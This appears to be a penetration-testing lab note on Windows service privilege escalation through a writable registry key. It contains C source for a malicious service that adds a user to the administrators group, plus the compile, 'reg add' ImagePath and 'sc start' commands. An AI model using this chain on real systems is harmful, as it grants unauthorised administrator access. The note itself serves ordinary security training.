# Service Escalation - Registry

### What’s Service Escalation

Windows programs which run in background usually these service run with system privilege

if we can edit in `Executable Path` we can take a system privilege on this machine

***

### Detection

```powershell
Get-Acl -Path HKLM:\System\CurrentControlSet\Services\<ServiceName> | Format-List
## u can get service name using
Get-Service
```

![2025-07-05 19\_29\_49-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 05_19_29_49 Kali_Linux_ _VMware_Workstation.png>)

***

### Exploitation

we create shared folder from kali to windows to allow us to move files smoothly

then we will edit in this file `windows_service.c` to addus on Admin group

*   `windows_service.c`

    ```powershell
    #include <windows.h>
    #include <stdio.h>

    #define SLEEP_TIME 5000

    SERVICE_STATUS ServiceStatus; 
    SERVICE_STATUS_HANDLE hStatus; 
     
    void ServiceMain(int argc, char** argv); 
    void ControlHandler(DWORD request); 

    //add the payload here
    int Run() 
    { 
        system("cmd.exe /k net localgroup administrators user /add");
        return 0; 
    } 

    int main() 
    { 
        SERVICE_TABLE_ENTRY ServiceTable[2];
        ServiceTable[0].lpServiceName = "MyService";
        ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

        ServiceTable[1].lpServiceName = NULL;
        ServiceTable[1].lpServiceProc = NULL;
     
        StartServiceCtrlDispatcher(ServiceTable);  
        return 0;
    }

    void ServiceMain(int argc, char** argv) 
    { 
        ServiceStatus.dwServiceType        = SERVICE_WIN32; 
        ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
        ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
        ServiceStatus.dwWin32ExitCode      = 0; 
        ServiceStatus.dwServiceSpecificExitCode = 0; 
        ServiceStatus.dwCheckPoint         = 0; 
        ServiceStatus.dwWaitHint           = 0; 
     
        hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
        Run(); 
        
        ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
        SetServiceStatus (hStatus, &ServiceStatus);
     
        while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
        {
                    Sleep(SLEEP_TIME);
        }
        return; 
    }

    void ControlHandler(DWORD request) 
    { 
        switch(request) 
        { 
            case SERVICE_CONTROL_STOP: 
                            ServiceStatus.dwWin32ExitCode = 0; 
                ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
                SetServiceStatus (hStatus, &ServiceStatus);
                return; 
     
            case SERVICE_CONTROL_SHUTDOWN: 
                ServiceStatus.dwWin32ExitCode = 0; 
                ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
                SetServiceStatus (hStatus, &ServiceStatus);
                return; 
            
            default:
                break;
        } 
        SetServiceStatus (hStatus,  &ServiceStatus);
        return; 
    } 
    ```

then compile file on linux and move it to windows

```bash
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
# NOTE: if this is not installed, use
sudo apt install gcc-mingw-w64
```

**In windows vm**

edit path of regsvc

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```

then run service

```powershell
sc start regsvc
```

```powershell
# to show all users in admin group
net localgroup administrators
```

![2025-07-05 19\_39\_50-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 05_19_39_50 Kali_Linux_ _VMware_Workstation.png>)
